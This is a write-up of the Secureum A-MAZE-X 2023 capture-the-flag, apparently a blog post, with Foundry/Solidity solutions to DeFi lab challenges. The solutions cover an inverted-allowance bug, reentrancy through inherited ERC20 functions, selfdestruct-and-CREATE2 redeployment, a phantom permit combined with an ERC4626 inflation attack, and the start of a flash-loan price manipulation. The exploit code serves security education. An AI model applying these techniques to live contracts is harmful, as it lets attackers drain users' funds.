@@ -1,0 +1,1037 @@
+# Secureum A-MAZE-X CTF 2023 At DeFi Security Summit
+
+<p className="text-xs text-right">July 17, 2023 by [patrickd](/about#patrickd)</p>
+
+Once more, Secureum is holding a Capture The Flag event. This time as part of the [DeFi Security Summit's 101 event](https://defisecuritysummit.org/defi-101-2023/) happening shortly before [EthCC](https://www.ethcc.io/) in Paris.
+
+Let's take a look!
+
+---
+
+> ### [Challenge 1: Operation magic redemption](https://github.com/secureum/AMAZEX-DSS-PARIS/tree/main/src/1_MagicETH)
+> A prominent protocol, InsecStar, finds itself under attack. Their token, MagicETH (mETH), has been drained through an exploit in their borrow & loan protocol.
+> 
+> InsecStar has urgently summoned you to devise a method to recover the stolen tokens and redeem them for ETH before the situation worsens. This is a critical test of your capabilities. Can you rise to the occasion and secure the tokens, thereby reinforcing the strength and resilience of the Ethereum ecosystem?
+> 
+> 📌 Recover 1000 mETH from the exploiter wallet.
+> 
+> 📌 Convert the mETH to ETH to avoid further losses.
+
+Oh, a backhack! Similar to whitehacks these attempts to rescue funds can backfire fatally when executed badly. Especially when executed on Ethereum's mainnet where [Frontrunners](https://samczsun.com/escaping-the-dark-forest/) are just waiting for a juicy opportunity – that's unlikely to be the case on our local development environment though.
+
+Let's take a look at the [setup process and success conditions](https://github.com/secureum/AMAZEX-DSS-PARIS/blob/main/test/Challenge1.t.sol) of this challenge:
+
+```solidity
+function setUp() public {
+    mETH = new MagicETH();
+
+    mETH.deposit{value: 1000 ether}();
+    // exploiter is in control of 1000 tokens
+    mETH.transfer(exploiter, 1000 ether);
+}
+
+function testExploit() public {
+    ...
+
+    assertEq(whitehat.balance, 1000 ether, "whitehat should have rescue 1000 ether");
+}
+```
+
+A thousand ether are deposited into the mETH contract and that same amount of mETH tokens are then immediately given to the exploiter. So it seems we won't get insight into how the exploit was actually executed here – the setup makes it as if everything has already happened. The success condition is a single assertion requiring the "whitehat" account, that we're controlling, to own all of the ether contained in the mETH protocol.
+
+Initially, I thought that the hacker might have used an exploitation contract, but it seems like the "exploiter" account is a simple EOA (meaning a wallet with a public key-pair). So we won't have to find issues in an exploitation contract to hack-back the funds, we're likely expected to use the same vulnerability that the exploiter supposedly used too to reobtain the mETH ERC20 tokens and then quickly use them to withdraw the ether so that they can't be stolen again.
+
+A first look at [`MagicETH`](https://github.com/secureum/AMAZEX-DSS-PARIS/blob/main/src/1_MagicETH/MagicETH.sol) reveals that it is a weird mix of a Vault and Wrapper function. The `deposit()` function gives you exactly as many mETH in return as you put ether in. And the `withdraw()` function will return ether to you in exchange for mETH, but since mETH can be burned, it's possible to receive more ether than you have mETH. Anyway, we (the whitehat) have neither ether nor mETH to use either of these methods.
+
+```solidity
+contract MagicETH is ERC20("Magic insecure ETH", "mETH") {
+    function deposit() public payable { ... }
+
+    function withdraw(uint256 wad) external { ... }
+
+    function burnFrom(address account, uint256 amount) public {
+        uint256 currentAllowance = allowance(msg.sender, account);
+        require(currentAllowance >= amount, "ERC20: insufficient allowance");
+
+        _approve(account, msg.sender, currentAllowance - amount);
+
+        _burn(account, amount);
+    }
+}
+```
+
+Things get more interesting in the `burnFrom()` method that is supposed to enable users to burn mETH tokens from accounts that gave them an allowance to do so. The [`allowance()`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L127C14-L127C55) function, inherited from OpenZeppelin's standard ERC20 contract, has the following parameters:
+
+```solidity
+function allowance(address owner, address spender) public view virtual returns (uint256) {}
+```
+
+On the other hand, the [`_approve()`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L313C5-L313C89) method, looks like this:
+
+```solidity
+function _approve(address owner, address spender, uint256 amount) internal virtual {}
+```
+
+So instead of loading how much the `account` has approved to the `sender`, `MagicETH` checks how much the `sender` has approved to the `account` – it's the wrong way around for the purposes of this function. And worse, later it overwrites the correct approval amount with the incorrect amount that it had loaded. Therefore the `sender` can give the `account` an allowance, call `burnFrom()` and turn this allowance around so that the `account` has suddenly given it to the `sender` as well.
+
+```solidity
+function testExploit() public {
+    ...
+    vm.startPrank(whitehat, whitehat);
+    /*//////////////////////////////
+    //    Add your hack below!    //
+    //////////////////////////////*/
+
+    // First give the exploiter approval for 1000 mETH (although we don't own any).
+    mETH.approve(exploiter, 1000 ether);
+
+    // Flip the approval around.
+    // We have to specify 0 as amount so that nothing is burned but the allowance is updated.
+    mETH.burnFrom(exploiter, 0);
+
+    // Now we have the approval to transfer the exploiter's mETH to ourselves.
+    mETH.transferFrom(exploiter, whitehat, 1000 ether);
+
+    // Finally, redeem the mETH for ether so it can't be stolen back again.
+    mETH.withdraw(1000 ether);
+
+    //============================//
+    vm.stopPrank();
+    ...
+}
+```
+
+And with that, we have solved the first challenge!
+
+```bash
+(base) ubuntu@dss23-defi101:~/dss23-defi101$ forge test --match-path test/Challenge1.t.sol
+[⠒] Compiling...
+[⠃] Compiling 1 files with 0.8.17
+[⠊] Solc 0.8.17 finished in 680.44ms
+Compiler run successful!
+
+Running 1 test for test/Challenge1.t.sol:MagicETHTest
+[PASS] testExploit() (gas: 137259)
+Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 876.03µs
+```
+
+---
+
+>### [Challenge 2: Mission Modern WETH: Rescue the Ether](https://github.com/secureum/AMAZEX-DSS-PARIS/tree/main/src/2_ModernWETH)
+>
+>In the ever-evolving world of decentralized finance, an ambitious developer took it upon himself to update the well-established WETH9. The result was ModernWETH, a modernized version in Solidity, that rapidly attracted deposits of over 1000 Ether.
+>
+>However, we've encountered a challenge. Hidden within the code, a potential vulnerability threatens the security of the funds locked within the contract. This situation calls for the dedication and expertise of blockchain security auditors. Are you ready to step up, solve this issue, and play a crucial role in preserving the sanctity of the Ethereum ecosystem? This is the test of our resolve and adaptability, something I've seen in this community time and again.
+>
+>📌 Starting with 10 ETH, recover 1000 ETH from the ModernWETH contract.
+>
+>📌 Recover all ETH to avoid further losses from ModernWETH contract. Whitehat hacker should end up with 1010 ETH.
+
+The [WETH9](https://etherscan.io/address/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2#code) contract, commonly simply referred to as WETH, is a simple wrapper contract that allows you to change your native ether into ERC20-compatible tokens. Many protocols prefer dealing with WETH instead of the native token as it reduces complexity: The project only needs one code path for any ERC20 token and no special native handling is necessary.
+
+```solidity
+contract ModernWETH is ERC20("Modern Insec Wrapped Ether", "mWETH"), ReentrancyGuard {
+    function deposit() public payable { ... }
+
+    function withdraw(uint256 wad) external nonReentrant {
+        (bool success,) = msg.sender.call{value: wad}("");
+        require(success, "mWETH: ETH transfer failed");
+
+        _burn(msg.sender, wad);
+    }
+
+    function withdrawAll() external nonReentrant {
+        (bool success,) = msg.sender.call{value: balanceOf(msg.sender)}("");
+        require(success, "mWETH: ETH transfer failed");
+
+        _burnAll();
+    }
+
+    function _burnAll() internal {
+        _burn(msg.sender, balanceOf(msg.sender));
+    }
+}
+```
+
+One of the first things to notice is that the Checks-Effects-Interactions pattern is not followed: External calls to another address (the `msg.sender`) are made and the effects (`burn()`/`burnAll()`) are only applied afterward. Unsafe external calls like these can allow for reentrancy, in this case, the `msg.sender` could reenter the `ModernWETH` contract and have the same or other functions of the contract operate on an outdated state.
+
+But wait! The `nonReentrant` modifier is present, which is a mutex that only allows to reenter once the first function execution has been completed. So with that in place a reentrancy shouldn't be possible! – And this is where this challenge tricks you: The mutex is only applied to the methods that have specifically been annotated with it – which isn't the case with inherited functions here! So while we can't re-enter through the functions with the modifier, nothing is stopping us from re-entering the contract through another function which does not have it.
+
+But which one? Looking at OpenZeppelin's [`_burn()`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L241-L298) method, it's clear that it would revert with `ERC20InsufficientBalance` if someone attempts to burn more tokens than the specified account has. So if we were to reenter through `transfer()` during the call into `withdraw()` and attempt transferring the tokens to somewhere else, the `_burn()` method would revert as the amount (`wad`) is suddenly insufficient.
+
+But that isn't true for `withdrawAll()` which uses `_burnAll()` and burns the current amount of tokens *after* the ether amount has already been transferred. So the exploit is simple: We write a contract that calls `withdrawAll()` for our 10 mWETH and when `ModernWETH` makes the external call to send the ETH this exploit contract can transfer the 10 mWETH back to us so that they don't get burned. Do that 100 times and we're done!
+
+```solidity
+function testWhitehatRescue() public {
+    ...
+    vm.startPrank(whitehat, whitehat);
+    /*//////////////////////////////
+    //    Add your hack below!    //
+    //////////////////////////////*/
+
+    // Wrap our 10 ether to mWETH.
+    modernWETH.deposit{ value: 10 ether }();
+
+    // Deploy our exploit contract.
+    MWETHExploit exploit = new MWETHExploit(whitehat, modernWETH);
+
+    for (uint256 i = 0; i < 100; i++) {
+        // Transfer 10 mWETH to the exploit contract.
+        modernWETH.transfer(address(exploit), 10 ether);
+
+        exploit.pwn();
+    }
+
+    modernWETH.withdrawAll();
+
+    //============================//
+    vm.stopPrank();
+    ...
+}
+```
+
+```solidity
+contract MWETHExploit {
+    address payable immutable whitehat;
+    ModernWETH immutable modernWETH;
+    constructor(address _whitehat, ModernWETH _modernWETH) {
+        modernWETH = _modernWETH;
+        whitehat = payable(_whitehat);
+    }
+
+    function pwn() external {
+        modernWETH.withdrawAll();
+    }
+
+    // Triggered when ETH is received.
+    fallback() payable external {
+        // Transfer the ETH we've just unwrapped.
+        whitehat.transfer(10 ether);
+        // Transfer the mWETH we've unwrapped before it gets burned from redemption.
+        modernWETH.transfer(whitehat, 10 ether);
+    }
+}
+```
+
+---
+
+> ### [Challenge 3: LendEx pool hack](https://github.com/secureum/AMAZEX-DSS-PARIS/tree/main/src/3_LendingPool)
+> 
+> In the realm of decentralized finance, where trust is often bestowed upon code, a groundbreaking borrowing and lending platform known as LendEx was created.
+>
+> Unbeknownst to the LendEx team, a hacker hid a bug in the LendingPool smart contract with a intention to exploit the bug later. LendEx team reviewed smart contract source code, approved it for the usage and deposited the funds from the LendExGovernor contract to the LendingPool contract.
+>
+> Do you have what it takes to spot how hacker is planning to exploit the LendEx?
+> 
+> 📌 You have to fill the shoes of the hacker and execute the exploit by stealing stablecoins from a lending pool.
+>
+> 📌 Note: Foundry has a bug. If a selfdestruct() is triggered in a test script then it has to be done in the setUp() function and the rest of the code should be in a different function otherwise foundry test script does not see that selfdestruct happened to a contract.
+
+From the description I assume there's some very tricky way how the code is exploitable that isn't obvious at all, maybe it's some sort of Solidity weirdness – maybe it's one of the previous submissions to the [Underhanded Solidity Contest](https://underhanded.soliditylang.org/)? Let's start by checking the [setup and winning conditions](https://github.com/secureum/AMAZEX-DSS-PARIS/blob/main/test/Challenge3.t.sol) again since they weren't really clear from the intro:
+
+```solidity
+function setUp() public {
+    ...
+    usdc = new USDC(usdcAmount);
+    usdc.transfer(governanceOwner, usdcAmount);
+
+    vm.startPrank(hacker);
+    create2Deployer = new Create2Deployer();
+    createDeployer = CreateDeployer(create2Deployer.deploy());
+    lendingPool = LendingPool(createDeployer.deploy(true, address(usdc)));
+    vm.stopPrank();
+
+    vm.startPrank(governanceOwner);
+    lendExGovernor = new LendExGovernor(address(usdc));
+    lendExGovernor.addContract(address(lendingPool));
+    usdc.transfer(address(lendExGovernor), usdcAmount);
+    lendExGovernor.fundLendingPool(address(lendingPool), usdcAmount);
+    ...
+}
+
+function testExploit() public{
+    ...
+    assertEq(lendExGovernor.getPoolName(address(lendingPool)), "LendingPool hack", "Hack contract address is recognized as approved address");
+    assertEq(usdc.balanceOf(hacker), usdcAmount, "Exploiter has to steal all the stablecoin tokens");
+}
+```
+
+The setup is quite complicated this time around – two "deployer" contracts? What are those for? Later it seems that all USDC created is deposited into the pool. The solve-conditions might actually be giving something away here: Apparently, the "governor" contract needs to have a "LendingPool hack" contract at the same address where the original pool was.
+
+From the code and the description it now sounds like we need to do the following: Somehow trigger the original pool to self-destruct, then use create2 to deploy a malicious pool at that address, and finally use the malicious pool to steal all the stablecoin tokens.
+
+The [`LendExGovernor`](https://github.com/secureum/AMAZEX-DSS-PARIS/blob/main/src/3_LendingPool/LendExGovernor.sol) contract appears to be simple: There are a few getters and setters, but at first glance they all seem fine and I doubt we'll have to do anything here.
+
+After that, I opened the [`LendingPool`](https://github.com/secureum/AMAZEX-DSS-PARIS/blob/main/src/3_LendingPool/LendingPool.sol) contract and the first thing I searched for was `selfdestruct`, and indeed:
+
+```solidity
+function emergencyStop() public onlyOwner {
+    selfdestruct(payable(0));
+}
+```
+
+Self-destructing a contract forces you to send all of the contract's ether balance to a specified address, here the zero-address, which is basically the same as burning all of it forever. But this pool isn't supposed to hold any ether in the first place, it'll hold USDC. Additionally, the contract's storage values will be purged as well, but this won't affect the USDC balance as that is stored in the USDC contract, not the pool. So even after self-destructing this address will still hold the USDC balance that we can recover if we're able to deploy a new contract at the same address.
+
+Another vector for causing the self-destruction of a contract is a delegate-call. If the pool contract would delegate-call another address, and we'd be able to specify the destination of this call, we could have a malicious contract take over the execution flow and self-destruct the caller. But thinking about it more, there'd be no need to self-destruct since, at that point, we could simply transfer the USDC tokens in the pool's name. Anyway, there's no delegate-call here.
+
+The question now is, how can we trigger the `emergencyStop()` method? It has an `onlyOwner` modifier which seems fine. The owner is set once during construction and there seems to be no obvious way to overwrite it. It also doesn't appear to be internally called anywhere. And there's no suspicious usage of assembly either. Is there a hidden unicode character sneakily hiding the code's real behavior? Maybe the weird expression evaluation order when emitting Solidity events is used to hide a malicious state update? Maybe there's a storage clash and we can overwrite the contract owner by using the other public methods?
+
+Let's approach it from the other side: Assuming we had already destructed the pool, how would we be able to deploy the [`LendingHack`](https://github.com/secureum/AMAZEX-DSS-PARIS/blob/main/src/3_LendingPool/LendingHack.sol) contract at that address?
+
+Remember the setup? First, the [`Create2Deployer`](https://github.com/secureum/AMAZEX-DSS-PARIS/blob/main/src/3_LendingPool/Create2Deployer.sol) was created, which seems to deploy the `CreateDeployer` via create2, or rather: with a static salt and therefore always at the same address. 
+
+```solidity
+contract Create2Deployer is Ownable {
+    ...
+
+    function deploy() external returns (address){
+        bytes32 salt = keccak256(abi.encode(uint256(1)));
+        return address(new CreateDeployer{salt: salt}(owner));
+    }
+}
+```
+
+The [`CreateDeployer`](https://github.com/secureum/AMAZEX-DSS-PARIS/blob/main/src/3_LendingPool/CreateDeployer.sol) contract will deploy the pool via a normal `new`, meaning that it uses the contract's nonce instead of a salt to determine the deployment address. That means that every time the `deploy()` function is called, the pool would be deployed at a different address *unless* we call `cleanup()` first in order to reset the nonce.
+
+```solidity
+contract CreateDeployer {
+    ...
+
+    function deploy(bool deployPool, address _usdc) public onlyOwner returns (address contractAddress) { 
+        if (deployPool) {
+            contractAddress = address(new LendingPool(owner(), _usdc));
+        } else {
+            contractAddress = address(new LendingHack(owner(), _usdc));
+        }
+    }
+
+    function cleanUp() public onlyOwner {
+        selfdestruct(payable(address(0)));
+    }
+}
+```
+
+Based on this new information, we now have to do the following to build on the previous assumptions: After self-destructing the pool, we also have to self-destruct `CreateDeployer` by calling `cleanUp()`. Then we'll be able to deploy `LendingHack` at its original address by calling `Create2Deployer`'s permissionless `deploy()` function. But once more, the self-destruct is behind a `onlyOwner` modifier, this time in a contract with much less complex code – so how to do it?
+
+If you were paying attention, you should've noticed by now that I made an incorrect assumption right at the beginning: I assumed that the exploiter wouldn't be the owner – why would he be, right? If that were the case we could just call self-destruct on everything without anything stopping us. Well, the reason why that is the case, is that this challenge is supposed to reflect what happened during the [Tornado Cash hack](https://neptunemutual.com/blog/understanding-tornado-cash-exploit/) and how the exploiter gained control via the governance that the contracts were deployed with. Admittedly, that isn't quite well reflected here, it would be too complex to do so.
+
+import { Callout } from 'nextra/components'
+
+<Callout>
+  Note that more comments were added to the setup now to make it more obvious who the owner is
+</Callout>
+
+
+```solidity
+contract lendingPoolTest is Test {
+    ...
+    function setUp() public {
+        ...
+
+        vm.startPrank(exploiter);
+        /*//////////////////////////////
+        //    Add your hack below!    //
+        //////////////////////////////*/
+
+        // Due to the mentioned Foundry weirdness, we have to do any calls that cause a
+        // self-destruct here, in the setUp function.
+        lendingPool.emergencyStop();
+        createDeployer.cleanUp();
+
+        //============================//
+        vm.stopPrank();
+    }
+
+    function testExploit() public{
+        vm.startPrank(exploiter);
+        /*//////////////////////////////
+        //    Add your hack below!    //
+        //////////////////////////////*/
+
+        // Re-deploying both CreateDeployer and the pool at the same address,
+        // with the difference that it's a malicious pool this time.
+        createDeployer = CreateDeployer(create2Deployer.deploy());
+        pool = LendingPool(createDeployer.deploy(false, address(usdc)));
+
+        LendingHack(address(pool)).pwn(usdc, exploiter);
+
+        //============================//
+        ...
+    }
+}
+```
+
+```solidity
+contract LendingHack {
+        /*//////////////////////////////
+        //    Add your hack below!    //
+        //////////////////////////////*/
+
+        function pwn(USDC usdc, address exploiter) external {
+            // Transfer the entire USDC balance from this malicious pool contract
+            // to the exploiter account.
+            usdc.transfer(exploiter, usdc.balanceOf(address(this)));
+        }
+
+        // Necessary for challenge success conditions.
+        string constant public name = "LendingPool hack";
+
+        //============================//
+}
+```
+
+---
+
+### Challenge 4
+
+<Callout type="error">
+  Challenge 4 was removed due to an error: It assumed that **the destination address of the CREATE2 operation** is based on the `msg.sender`, but **it is actually based on the contract's address that is executing the operation** (`address(this)`). This confusion stemmed from the fact that this address is commonly referred to as the "sender" in EVM documentations. Furthermore, this challenge was very sensitive to changes (comments, filenames, folders, compiler version, etc) that impacted the resulting bytecode and therefore the target address, making it appear as if the `msg.sender` were relevant.
+</Callout>
+
+---
+
+> ### [Challenge 5: Balloon Vault](https://github.com/secureum/AMAZEX-DSS-PARIS/tree/main/src/5_balloon-vault)
+> 
+> A ERC4626 vault known as the "Balloon Vault" has been built to gather WETH and invest it on multiple strategies. This vault was thought to be impenetrable, designed meticulously to maintain the security and integrity of the tokens stored within.
+> 
+> The process was straightforward: individuals deposited their digital assets into the Balloon Vault, receiving shares in return. These shares represented their holdings and served as a way to track their savings.
+> 
+> Two users of the vault, Alice and Bob, have fallen prey to a potential security vulnerability, jeopardizing their significant holdings of 500 WETH each. Protocol try to reach them with no luck...
+> 
+> You have been summoned by the custodians of the Balloon Vault, challenged to assess and exploit the lurking vulnerability, and drain the wallets of Alice and Bob before a bad actor do it. By successfully accomplishing this, you rescue 1000 WETH from Alice&Bob.
+> 
+> 📌 Drain Bob's wallet and Alice's wallet
+> 
+> 📌 End up with more than 1000 ETH in your wallet
+
+Whenever I hear Vault, especially when it's ERC4626, I think: Inflation Attack. Basically, an attacker can steal funds of such Vaults by frontrunning user deposits. So that was my first thought, but after continuing to read the description I'm not so sure anymore. Let's start by looking at [the setup](https://github.com/secureum/AMAZEX-DSS-PARIS/blob/main/test/Challenge5.t.sol):
+
+```solidity
+function setUp() public {
+    vault = new BallonVault(address(weth));
+
+    // Attacker starts with 10 ether
+    vm.deal(address(attacker), 10 ether);
+
+    // Set up Bob and Alice with 500 WETH each
+    weth.deposit{value: 1000 ether}();
+    weth.transfer(bob, 500 ether);
+    weth.transfer(alice, 500 ether);
+
+    vm.prank(bob);
+    weth.approve(address(vault), 500 ether);
+    vm.prank(alice);
+    weth.approve(address(vault), 500 ether);
+}
+```
+
+What's interesting here: Alice's and Bob's funds have only been approved for usage to the Vault – they haven't actually been used yet. So the Vault is still empty and the Inflation Attack could still be possible – under the condition that it's possible for the attacker to deposit their approved funds without needing their permission.
+
+```solidity
+contract BallonVault is ERC4626 {
+    constructor(address underlying) ERC20("BallonVault", "E4626B") ERC4626(ERC20(underlying)) {}
+
+    function depositWithPermit(address from, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
+        external
+    {
+        IERC20Permit(address(asset())).permit(from, address(this), amount, deadline, v, r, s);
+
+        _deposit(from, from, amount, previewDeposit(amount));
+    }
+}
+```
+
+The [`BallonVault`](https://github.com/secureum/AMAZEX-DSS-PARIS/blob/main/src/5_balloon-vault/Vault.sol) itself basically just extends OpenZeppelin's ERC4626 implementation by a single function. And this function looks just like another vector: Phantom Functions. This vector allows us to do exactly what we need: Being able to deposit funds that are already approved to the Vault, without actually having gotten the permission from the fund's owners to do so.
+
+But first of all, what are Phantom Functions? Basically it's a type of vulnerability where the caller relies on the called contract to have a certain function implemented. This assumed function is supposed to execute some sort of check and revert when these checks failed. Such a function could be the `permit()` method, which is used in this case as well.
+
+What is the `permit()` method expected to do? In the above code, the `depositWithPermit()` function passes a signature to it expecting the following: If the signature is valid, the specified `from` address has signed a message, proving that this address intends to give the `BaloonVault` contract an allowance to use, in this case, for a deposit. But there's a second assumption here: That the person calling the `depositWithPermit()` function could only do this (ie. be in possession of this signature) if the owner of the funds (`from`) has given them the permission to make use of it.
+
+And this is where the problem lies: If the signature is invalid, `depositWithPermit()` expects the `permit()` method to revert. But in the case of WETH, it won't revert and it'll continue making the deposit under the assumption that a correct signature was passed. If you've looked at this challenge's [`WETH`](https://github.com/secureum/AMAZEX-DSS-PARIS/blob/main/src/5_balloon-vault/WETH.sol) contract you'd now rightfully protest and say: But wait! The WETH contract does not have a `permit()` method, so the call to it should fail! – And you'd be correct. Except for the case that the call made to WETH's `permit()` will be picked up by its `fallback()` handler instead, which will just silently have the call succeed. And that's what makes `permit()` a Phantom Function: Even though it doesn't exist within the `WETH` contract, calling it will still appear to have succeeded as if the signature was valid.
+
+So thanks to the fact that Alice and Bob have already given approval of their funds to the `BallonVault` contract, we just have to pass an invalid signature to deposit their funds into the Vault. This still doesn't give us access to their funds, since the receivers of the shares will still be Alice and Bob respectively. But here's where the Inflation Attack comes into play: We can ensure that they don't get any shares at all, while we're the only ones who have a share that can be redeemed for all of their deposited funds.
+
+An Inflation Attack basically consists of the following steps:
+
+1. The attacker deposits 1 wei of an asset into an empty vault, getting 1 wei back in the form of the Vaults share token.
+2. The attacker then front-runs a user's deposit request (in this special case, the attacker actually initiates the user's deposit themselves through the Phantom Function vulnerability). Before the user's deposit is made, the attacker donates (ie. sending it directly into the Vault without using the deposit function and without getting any shares) the same amount of assets into the Vault.
+3. When the user's deposit finally happens, the user obtains 0 shares in exchange for their assets. The reason for this is that the formula calculating the number of shares was manipulated by the donation of assets, causing the user's deposit to be rounded down to 0.
+4. The attacker is the only one in possession of Vault shares (1 wei) and can redeem this to obtain all of the Vaults assets. Due to the fact that the attacker only has 10 ETH to start with while Alice and Bob have 500, we'll have to execute these steps multiple times. That's because for this attack to work the attacker must be able to match the deposit made by the user.
+
+OpenZeppelin's ERC4626 implementation actually [introduced a mitigation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC4626.sol#L30-L43) against this attack that doesn't fully prevent it, but at least makes it a lot harder to profit from it. Lucky for us this fix was made in version 4.9, and the release used here is 4.8 – exactly one minor version before the issue was fixed!
+
+In this version, the shares are determined by a simple formula:
+
+$`bb"shares"=lfloor((bb"newAssets"*bb"totalSupply")/(bb"totalAssets"))rfloor`$
+
+After the attacker deposited a single wei of assets, the `totalAssets` become 1 wei and the `totalSupply` (ie. supply of vault share tokens) becomes 1 wei as well. Let's say that a user wants to deposit 100 wei into the Vault, but before that happens the attacker donates 100 of their own wei, increasing `totalAssets` to 101 while the `totalSupply` stays at 1 wei.
+
+$`bb"shares"=lfloor((100*1)/(101))rfloor=lfloor0,990rfloor=0`$
+
+Rounded down to integers, this will result in 0 shares for the user. The same principle applies to our attack, just with bigger numbers.
+
+
+```solidity
+function testExploit() public {
+    vm.startPrank(attacker);
+
+    /*//////////////////////////////
+    //    Add your hack below!    //
+    //////////////////////////////*/
+
+    // Convert attacker's ETH to WETH.
+    weth.deposit{value: 10 ether}();
+    // Give unlimited approval to Vault.
+    weth.approve(address(vault), type(uint256).max);
+
+    // Repeatedly exploit the Vault to obtain Alice's funds.
+    while (weth.balanceOf(alice) > 0) {
+        // Set-up attack by depositing 1 wei of WETH for 1 wei of Vault shares.
+        vault.deposit(1, attacker);
+        // Donate everything the attacker has.
+        uint256 budget = weth.balanceOf(attacker);
+        weth.transfer(address(vault), budget);
+        // Exploit the phantom permit function to deposit for Alice.
+        uint256 victimBalance = weth.balanceOf(alice);
+        uint256 booty = (budget < victimBalance) ? budget : victimBalance;
+        vault.depositWithPermit(alice, booty, 0, 0, 0, 0);
+        // Redeem attacker's shares for both the donation and the victim's deposit.
+        vault.redeem(1, attacker, attacker);
+    }
+
+    // Having stolen all of Alice's WETH, the attacker now has enough budget to
+    // steal from Bob in a single step.
+
+    // Set-up attack by depositing 1 wei of WETH for 1 wei of Vault shares.
+    vault.deposit(1, attacker);
+    // Donate the same amount that Bob owns.
+    weth.transfer(address(vault), 500 ether);
+    // Exploit the phantom permit function to deposit for Bob.
+    vault.depositWithPermit(bob, 500 ether, 0, 0, 0, 0);
+    // Redeem attacker's shares for both the donation and the victim's deposit.
+    vault.redeem(1, attacker, attacker);
+
+
+    //============================//
+
+    vm.stopPrank();
+    assertGt(weth.balanceOf(address(attacker)), 1000 ether, "Attacker should have 1000 ether");
+}
+```
+
+---
+
+> ### [Challenge 6: Safe Yield?](https://github.com/secureum/AMAZEX-DSS-PARIS/tree/main/src/6_yieldPool)
+> 
+> You got your hands on 0.1 ETH, and of course you would like to stack more. Luckily there's a promising DeFi protocol which allows depositors to earn fees on both dex swaps and flash loans from others. But it takes so long to earn any meaningful amount...
+> 
+> Can you do faster?
+> 
+> 📌 Drain at least 100 ETH from the yield pool
+
+That sounds like some sort of price manipulation should be possible.. Maybe the price is influenced simply by taking a flash loan? Let's see..
+
+```solidity
+function setUp() public {
+    // setup pool with 10_000 ETH and Secureum Token
+    uint start_liq = 10_000 ether;
+    vm.deal(address(owner), start_liq);
+    vm.prank(owner);
+
+    token = new SecureumToken(start_liq);
+    yieldPool = new YieldPool(token);
+
+    token.increaseAllowance(address(yieldPool), start_liq);
+    yieldPool.addLiquidity{value: start_liq}(start_liq); 
+
+    // attacker starts with 0.1 ether
+    vm.deal(address(attacker), 0.1 ether);
+}
+```
+
+It appears that in the initial setup, there'll be a 1-to-1 ratio between the ETH and the Token in the `YieldPool`.
+
+```solidity
+contract YieldPool is ERC20("Safe Yield Pool", "syLP"), IERC3156FlashLender {
+
+    ...
+
+    function getReserve() public view returns (uint) {
+        return TOKEN.balanceOf(address(this));
+    }
+
+    ...
+
+    function ethToToken() public payable {
+        uint256 tokenReserve = getReserve();
+        uint256 tokensBought = getAmountOfTokens(
+            msg.value,
+            address(this).balance - msg.value,
+            tokenReserve
+        );
+        ...
+    }
+
+    function tokenToEth(uint _tokensSold) public {
+        uint256 tokenReserve = getReserve();
+        uint256 ethBought = getAmountOfTokens(
+            _tokensSold,
+            tokenReserve,
+            address(this).balance
+        );
+        ...
+    }
+    ...
+}
+```
+
+A quick glance at [`YieldPool`](https://github.com/secureum/AMAZEX-DSS-PARIS/blob/main/src/6_yieldPool/YieldPool.sol)'s swapping functions shows that indeed: The swap amounts are calculated based on the current token and ether balances and there appears to be nothing that prevents swapping while a flash loan has been taken.
+
+Going ahead with these assumptions, the exploitation strategy to obtain as much ether as possible would be to flash loan a lot of ST Token from the pool. This would decrease the `YieldPool`'s holdings as if there were a high demand for these tokens making them very expensive while making ETH very cheap.
+
+```solidity
+function getAmountOfTokens(
+uint256 inputAmount,
+uint256 inputReserve,
+uint256 outputReserve
+) public pure returns (uint256) {
+    require(inputReserve > 0 && outputReserve > 0, "invalid reserves");
+    uint256 inputAmountWithFee = inputAmount * 99;
+    uint256 numerator = inputAmountWithFee * outputReserve;
+    uint256 denominator = (inputReserve * 100) + inputAmountWithFee;
+    return numerator / denominator;
+}
+```
+
+Swapping would revert if we flash loaned *all* of the tokens ("invalid reserves"), and anyway, we'll need to buy some of these tokens to make the actual swap and also to pay the borrowing fee. To get a feeling for this, let's borrow all but 1 wei of Tokens and see how the price changes.
+
+```solidity
+contract FlashLoanTest is Test {
+    ...
+
+    function testExploitPool() public {
+        vm.startPrank(attacker);
+        /*//////////////////////////////
+        //    Add your hack below!    //
+        //////////////////////////////*/
+
+        FlashLoanReceiver flashLoanReceiver = new FlashLoanReceiver();
+
+        // Get price: How much ETH do we get for 1 Token?
+        yieldPool.getAmountOfTokens(1 ether, token.balanceOf(address(yieldPool)), address(yieldPool).balance);
+
+        uint256 maxFlashLoan = yieldPool.maxFlashLoan(address(token));
+
+        // Flashloan all but 1 wei of ST Tokens.
+        yieldPool.flashLoan(
+            IERC3156FlashBorrower(address(flashLoanReceiver)),
+            address(token),
+            maxFlashLoan - 1,
+            hex""
+        );
+
+        //============================//
+        vm.stopPrank();
+
+        assertGt(address(attacker).balance, 100 ether, "hacker should have more than 100 ether");
+    }
+}
+
+contract FlashLoanReceiver {
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    // Flashloan callback.
+    function onFlashLoan(address initiator, address token, uint256 amoount, uint256 fee, bytes calldata data) external returns (bytes32) {
+        YieldPool yieldPool = YieldPool(payable(msg.sender));
+
+        // Get price: How much ETH do we get for 1 Token?
+        yieldPool.getAmountOfTokens(1 ether, SecureumToken(token).balanceOf(address(yieldPool)), address(yieldPool).balance);
+
+        return CALLBACK_SUCCESS;
+    }
+}
+```
+
+```
+(base) ubuntu@dss23-defi101:~/dss23-defi101$ forge test --match-path test/Challenge6.t.sol -vvvv
+...
+  [221562] FlashLoanTest::testExploitPool() 
+    ...
+    ├─ [881] YieldPool::getAmountOfTokens(1000000000000000000 [1e18], 10000000000000000000000 [1e22], 10000000000000000000000 [1e22]) [staticcall]
+    │   └─ ← 989901999702029499 [9.899e17]
+    ...
